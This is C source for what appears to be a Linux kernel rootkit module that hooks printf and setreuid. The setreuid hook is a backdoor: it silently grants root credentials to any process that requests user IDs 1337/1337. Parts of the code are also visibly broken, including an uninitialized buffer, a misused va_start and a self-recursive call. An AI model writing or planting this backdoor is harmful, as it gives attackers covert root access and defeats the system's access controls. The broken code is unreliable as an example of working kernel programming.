#include <linux/cred.h>

#include <r0mod/global.h>

asmlinkage int (*orig_printf)(const char *__restrict __format, ...);
asmlinkage int new_printf(const char *__restrict __format, ...)
{
    const char *buffer;

    va_list ap;
    va_start(ap, __restrict);
    vsprintf(buffer, __restrict, ap);
    va_end(ap);

    return orig_printf(buffer);
}

asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);

    if((ruid == 1337) && (euid == 1337))
    {
        printk("[Correct]: You got the correct ids.\n");
        commit_creds(prepare_kernel_cred(0));

        return new_setreuid(0, 0);
    }

    return orig_setreuid(ruid, euid);
}
